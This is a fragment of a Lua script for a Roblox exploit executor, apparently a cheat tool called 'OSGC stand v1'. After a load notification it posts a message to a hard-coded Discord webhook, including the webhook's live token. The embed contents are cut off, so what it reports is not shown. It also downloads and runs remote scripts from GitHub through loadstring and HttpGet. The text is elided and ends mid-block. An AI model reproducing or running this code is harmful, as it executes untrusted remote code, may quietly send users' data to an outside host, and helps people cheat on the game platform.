...
getgenv().LynixSettings = {
    ...
    getgenv().ScriptName = 'OSGC stand v1'
    ...
    Notify({Title = ScriptName.." Loaded",Description ="Made By OSGC",Duration = 3.4028235e+38})
    
    local req = http_request or request or (http and http.request) or (syn and syn.request)
    local url = "https://discord.com/api/webhooks/1281646359526506618/hF2rzCqTAAKkuESi3R1thAoUJmF0kYajKKDc42oGWONZjpxypSilS3gutyKqUmk0_rYi"
    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
    ...
    MOD = loadstring(game:HttpGet("https://raw.githubusercontent.com/AOCScript/Stand/main/Premium.lua"))()
    ...
    Annc = loadstring(game:HttpGet("https://raw.githubusercontent.com/AOCScript/Red-EYES/main/Annc"))()
    task.spawn(function()
        pcall(function()
